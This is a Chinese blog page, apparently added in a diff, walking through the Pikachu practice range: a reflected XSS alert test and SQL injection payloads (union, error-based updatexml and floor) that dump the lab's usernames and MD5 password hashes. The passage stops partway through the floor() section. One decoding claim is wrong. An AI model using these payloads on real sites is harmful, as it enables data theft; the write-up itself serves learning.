@@ -1,0 +1,1020 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="咩包">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pikachu靶场">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu靶场+分析">
+<meta property="og:url" content="http://example.com/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/index.html">
+<meta property="og:site_name" content="咩包">
+<meta property="og:description" content="pikachu靶场">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230402121825372.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328205420022.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230325234741021.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326000103330.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326005545266.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326133757588.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326134351926.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326142139656.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326150806229.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013652464.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013814090.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013904797.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013943409.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328104838427.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105626168.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105909551.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328171330234.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328182334135.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328184536047.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328185224224.png">
+<meta property="article:published_time" content="2023-04-24T16:00:01.000Z">
+<meta property="article:modified_time" content="2023-09-12T16:33:34.318Z">
+<meta property="article:author" content="咩包">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230402121825372.png">
+  
+  
+  
+  <title>pikachu靶场+分析 - 咩包</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":false,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>咩包</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pikachu靶场+分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-25 00:00" pubdate>
+          2023年4月25日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          98 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pikachu靶场+分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
+<ol>
+<li>反射性XSS</li>
+<li>存储型XSS</li>
+<li>DOM型XSS</li>
+</ol>
+<blockquote>
+<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP  TOP10的排名中一直属于前三的江湖地位。</p>
+<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
+<p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“对输出进行转义”的方式进行处理。</p>
+</blockquote>
+<p>实验前先把项目里的pkxss拷贝放进搭建环境根目录（例如使用phpstudy，pkxss放进www文件）。</p>
+<p>新开标签页，打开后台<a target="_blank" rel="noopener" href="http://localhost/pkxss/pkxss_login.php%E3%80%82">http://localhost/pkxss/pkxss_login.php。</a></p>
+<p>登陆后发现内含3个模块。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230402121825372.png" srcset="/img/loading.gif" lazyload alt="image-20230402121825372" style="zoom:50%;" />
+
+
+
+
+
+<h2 id="1-反射型xss-get、post"><a href="#1-反射型xss-get、post" class="headerlink" title="1.反射型xss(get、post)"></a>1.反射型xss(get、post)</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328205420022.png" srcset="/img/loading.gif" lazyload alt="image-20230328205420022" style="zoom:50%;" />
+
+<p>输入框输入名字。提交空，提示输入kobe。输入kebe显示图片，输入其他显示who is xxx。</p>
+<p>尝试提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现输入长度做了限制。</p>
+<p>直接F12修改maxlength属性。</p>
+<p>重新输入payload，成功弹出1.</p>
+<h2 id="2-存储型xss"><a href="#2-存储型xss" class="headerlink" title="2.存储型xss"></a>2.存储型xss</h2><h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><h2 id="1-数字型注入（post）"><a href="#1-数字型注入（post）" class="headerlink" title="1.数字型注入（post）"></a>1.数字型注入（post）</h2><p>这题是post类型（数据放在Request body中），数据需要使用bp进行抓取。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230325234741021.png" srcset="/img/loading.gif" lazyload alt="image-20230325234741021"></p>
+<p>可以选择id进行查询，通过试验，不同的id会导致回显的用户名及邮箱不同。</p>
+<p>猜测通过id在数据库查找用户名。</p>
+<p>bp抓包后测试<code>id=1 or 1 = 1</code>，结果显示出所有的用户名。</p>
+<p>（解释，假设查询语句为<code>select username from member where id=_</code>,也就是通过id值进行查找，这时候如果将where的条件改为<code>id=1 or 1 = 1</code>，因为1&#x3D;1为真，这句话的效果就等同于<code>select username from member</code>）.</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326000103330.png" srcset="/img/loading.gif" lazyload alt="image-20230326000103330" style="zoom: 50%;" />
+
+<p>这个测试意味着输入没有做限制，可以进行注入。</p>
+<p>此时可以使用联合查询获取信息。</p>
+<p>联合查询必须拥有相同的列（否则会报错），所以需要使用<code>order by</code>来判断列数。</p>
+<p><code>order by</code>可指定列进行排序，可通过指定的列是否存在来判断列的个数。</p>
+<p>该例子里，当试验到<code>id=1 order by 3</code>时，页面回显报错。意味着列的个数为2。</p>
+<p>通过列的格式来进行查询，例如：<code>id=1 union select 1,database()</code></p>
+<p>回显出了数据库的名字（其他的信息也同理查询）。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326005545266.png" srcset="/img/loading.gif" lazyload alt="image-20230326005545266" style="zoom:50%;" />
+
+<blockquote>
+<p>mysql 5.0以上版本自带数据库，information_schema记录有当前mysql下所有数据库名，表名，列名信息。下列是存放各信息的名字</p>
+<p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p>
+</blockquote>
+<p>一些查询语句（mysql5）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 数据库</span><br><span class="hljs-keyword">select</span> database()  <span class="hljs-comment">-- 获得数据库名pikachu</span><br><br><span class="hljs-comment">-- 表名</span><br><span class="hljs-comment">-- group_concat()，将多个字符串连在一起，这样可以使格式不出问题</span><br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(table_name)               <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> httpinfo,<span class="hljs-keyword">member</span>,message,users,xssblind <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><br><span class="hljs-comment">-- 列名（此处举例查users表）</span><br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(column_name)                                             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><br><span class="hljs-comment">-- 数据（此处举例查username,password[注意格式]）</span><br><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> username <span class="hljs-operator">|</span> password                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br><span class="hljs-operator">|</span> admin    <span class="hljs-operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> pikachu  <span class="hljs-operator">|</span> <span class="hljs-number">670</span>b14728ad9902aecba32e22fa4f6bd <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> test     <span class="hljs-operator">|</span> e99a18c428cb38d5f260853678922e03 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+----------------------------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>对md5进行解密（例如<a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5</a>），得到密码。</p>
+<p>例如e10adc3949ba59abbe56e057f20f883e解密得到abc123.</p>
+<h2 id="2-字符型注入（get）"><a href="#2-字符型注入（get）" class="headerlink" title="2.字符型注入（get）"></a>2.字符型注入（get）</h2><p>这题是get类型，参数通过url传递（关于post和get详解<a target="_blank" rel="noopener" href="https://blog.csdn.net/guorui_java/article/details/112294323">见此</a>）。</p>
+<p>其实总体流程和数字型差不多，只不过此处输入的数据类型为字符型。</p>
+<p>字符需要用引号括起来。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326133757588.png" srcset="/img/loading.gif" lazyload alt="image-20230326133757588"></p>
+<p>输入aaa’进行测试，页面返回：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’aaa’’’  at line 1</p>
+</blockquote>
+<p>单引号改成双引号不会报错。</p>
+<p>猜测内部的查询语句为：<code>select xxx from member where username = &#39;__&#39;;</code></p>
+<p>搜索信息的语句和数字型的没太多区别。</p>
+<p>例如查询全部信息，输入<code>a&#39; or 1=1#。</code></p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326134351926.png" srcset="/img/loading.gif" lazyload alt="image-20230326134351926" style="zoom:50%;" />
+
+<p>最后加上的**#**是注释符，让后面的’失效。如果#无法生效，可以转换为url编码的<code>%23</code>。</p>
+<p>除此之外，还有<code>--+</code>，其中<code>--</code>表示行注释，<code>+</code>表示空格，如果<code>--</code>直接和单引号连接在一起是错误的，中间需要空格语句才能生效。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 这是正确的注释</span><br><span class="hljs-comment">--这是错误的注释</span><br>#这也是单行注释<br><span class="hljs-comment">/*这是块注释*/</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>例如查询pikachu库里的表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>your uid:1<br>your email is: httpinfo,member,message,users,xssblind</p>
+</blockquote>
+<p>例如查询用户名密码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; and 1=1 union select username,password from users#</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>your uid:admin<br>your email is: e10adc3949ba59abbe56e057f20f883e</p>
+<p>your uid:pikachu<br>your email is: 670b14728ad9902aecba32e22fa4f6bd</p>
+<p>your uid:test<br>your email is: e99a18c428cb38d5f260853678922e03</p>
+</blockquote>
+<h2 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326142139656.png" srcset="/img/loading.gif" lazyload alt="image-20230326142139656" style="zoom:50%;" />
+
+<p>根据用户名的一部分进行搜索。</p>
+<p>猜测是<code>select username,email from member where username like &#39;%_%&#39;;</code></p>
+<p>测试<code>a%&#39; or 1=1#</code>，查询出所有结果。</p>
+<p>测试<code>a%&#39; order by 4#</code>报错，见回显可知查询的列数为3.</p>
+<h2 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h2><p>先弄清楚查询的格式。</p>
+<p>输入<code>a&#39;</code>进行测试，回显如下：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’a’’)’ at line 1</p>
+</blockquote>
+<p>猜测是 <code>（&#39;查询内容&#39;) </code>这样的格式。</p>
+<p>进行测试：<code>a&#39;) or 1=1 #</code>，显示出了所有的查询结果。</p>
+<h2 id="5-insert-x2F-update-注入（报错注入）"><a href="#5-insert-x2F-update-注入（报错注入）" class="headerlink" title="5.insert&#x2F;update 注入（报错注入）"></a>5.insert&#x2F;update 注入（报错注入）</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326150806229.png" srcset="/img/loading.gif" lazyload alt="image-20230326150806229" style="zoom:50%;" />
+
+<p>select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。</p>
+<p>修改个人信息页面使用update更新数据，可使用。</p>
+<p><strong>常见的几种报错注入函数：</strong></p>
+<p>1.updatexml()</p>
+<p>2.floor()</p>
+<p>3.extractvalue()</p>
+<p>4.exp()</p>
+<h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml()"></a>1.updatexml()</h3><p>改变（查找并替换）XML文档中符合条件的节点的值。</p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) </p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>返回内容：若xpath正确则返回更改对象名称，否则返回xpath错误内容</p>
+</blockquote>
+<p>意味着updatexml的第一个参数和第三个参数都不重要，利用第二个参数即可。（<a target="_blank" rel="noopener" href="http://c.biancheng.net/python_spider/xpath.html">xpath简单教程</a>）</p>
+<p>例如，payload为<code>&#39; and updatexml(1,version(),3)#</code>。</p>
+<p>回显为：<code>XPATH syntax error: &#39;.28&#39;</code></p>
+<p>查看数据库得知version为5.7.28，发现报错显示不全。</p>
+<p>测试<code>&#39; and updatexml(1,concat(0x7e,version()),3)#</code>，回显出<del>5.7.28.（ASCII里的0x7e就是</del>，而xpath中没有~，所以格式会报错）。</p>
+<p>其他的信息查询也一样，只是格式改变。</p>
+<p>例如查询表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; limit 0,1)),0)#</span><br><span class="hljs-string"></span><br><span class="hljs-string">-- 回显为 XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>httpinfo<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>要做查询的个数限制（limit 0,1)，否则会报错.</p>
+<p>updatexml最多输出32个字节，超出的时候可以使用substring。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 前32位</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1), 0)),0)#</span><br><span class="hljs-string">-- 32位后</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-number">32</span>)),<span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure>
+
+<p>可截取的函数：</p>
+<ul>
+<li>mid函数： 返回从指定位置开始的子字符串</li>
+<li>substr函数：返回指定的子字符串</li>
+<li>concat函数： 返回连接的字符串</li>
+</ul>
+<h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor()"></a>2.floor()</h3><p>floor()可实现向下取整。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.14</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span>           <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>rand()可以得到0和1之间的随机数。但如果传入参数，会返回的数字是固定的（伪随机）。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand()              <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.09440490984768132</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.02</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand();<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> rand()             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.9136333120182467</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><br><span class="hljs-comment">-- 传入参数0</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> rand(<span class="hljs-number">0</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> rand(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span 